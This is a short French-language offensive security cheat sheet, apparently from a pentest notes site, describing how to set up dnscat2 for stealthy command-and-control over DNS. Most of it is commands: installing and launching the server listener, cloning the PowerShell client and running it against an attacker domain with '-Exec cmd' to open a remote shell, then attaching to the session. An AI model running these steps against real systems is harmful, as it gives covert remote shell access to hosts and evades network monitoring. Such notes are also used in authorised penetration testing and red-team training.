---
public: true # set to true to make the article publishable
---
Cet outil offre de la furtivité mais cela au détriment des performances. Il faudra l'utiliser uniquement lorsque la discrétion est une priorité

## Installation

```
sudo apt install dnscat2
```

## Utilisation

### Serveur

```
# lance le listener et affiche la ligne de commande à lancer sur la cible
sudo dnscat2-server --dns domain=blabla.fr
[...]
./dnscat --secret=9daeec39519fcba5c8a62a8b157f5e1e blabla.fr
```

### Client

#### Powershell

```
git clone https://github.com/lukebaggett/dnscat2-powershell.git

Import-Module .\dnscat2.ps1
Start-Dnscat2 -DNSserver 1.2.3.4 -Domain myattacker-domain.com -PreSharedSecret xxxxxxxxxxxxxxxxxxxxxxxx -Exec cmd 
```

```
# Sur le serveur, apres que le client se soit connecté :
window
0 :: main [active]
  crypto-debug :: Debug window for crypto stuff [*]
  dns1 :: DNS Driver running on 0.0.0.0:53 domains = blabla.fr [*]
  1 :: (not set) [cleartext] [idle for 446 seconds]
  2 :: exec (MYHOST) [encrypted and verified] [*]     <====== NOTRE SESSION

# interaction
window -i 2

## ATTENTION : lorsque l'on saisie une commande, cela met beaucoup de temps à retourner une réponse !!

```